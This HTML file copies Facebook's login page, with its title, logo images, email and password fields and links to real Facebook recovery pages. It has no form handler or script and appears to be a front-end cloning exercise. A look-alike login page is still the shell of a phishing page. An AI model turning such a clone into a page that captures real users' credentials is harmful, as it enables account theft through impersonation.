<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>
    <link rel="icon" href="images/FB.ico" type="images/ico" sizes="16x16">
    <link rel="stylesheet" href="style.css">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100&display=swap" rel="stylesheet">
</head>

<body>
    <div class="mainSection">

        <div class="firstDiv">
            <img src="images/fb2.png" width="320px" height="400px" alt="Thanks Image from FB"><br><br>
            <h2 id="thanks">Thanks for stopping By!</h2> <br>
            <h3 id="hope">We hope to see you again soon.</h3>
        </div>

        <div class="secondDiv">
            <label for="email or phone number"></label>
            <input type="text" id="username" name="username" placeholder="Email address or phone number"> <br><br>
            <label for="password"></label>
            <input type="text/number" id="password" name="password" placeholder="Password"><br><br>
            <input type="submit" id="submit" value="Log In"> <br><br>
            <a id="forgot" target="_blank"
                href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotton
                password?</a> <br> <br>
            <hr id="hr"> <br>
            <input type="submit" id="createNewAccount" value="Create New Account"> <br>
        </div>

        <h3 id="create"> <a id="createp" target="_blank"
                href="https://www.facebook.com/pages/create/?ref_type=registration_form"><b>Create a Page</b>
                &nbsp;</a>for a celebrity, band or business.</h3>

    </div>

    <div class="clear"></div>

    <div class="footer">
        <p></p>

    </div>
</body>

</html>
